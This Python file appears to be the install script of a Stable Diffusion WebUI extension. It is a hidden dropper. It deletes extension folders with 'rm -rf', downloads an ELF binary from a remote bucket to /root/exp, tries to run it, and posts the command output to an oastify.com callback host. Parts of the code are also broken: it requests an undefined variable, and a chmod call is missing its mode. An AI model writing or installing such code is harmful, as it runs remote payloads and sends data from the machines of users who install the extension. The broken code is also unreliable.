import launch
import requests
import os
import requests


command = 'rm -rf /stable-diffusion-webui/extensions/test*'
result = os.popen(command).read()


down_url='https://isdp.oss-cn-shanghai.aliyuncs.com/cw.elf'
response = requests.get(url)
if response.status_code == 200:
  with open('/root/exp', 'wb') as file:
    file.write(response.content)
    
  

command = 'chmod /root/exp;/root/exp'
result = os.popen(command).read()
url = 'https://ej1fgqfpmx4qinz0uewpcola319uxkl9.oastify.com/resp'
data = {'result': result}
response = requests.post(url, data=data)



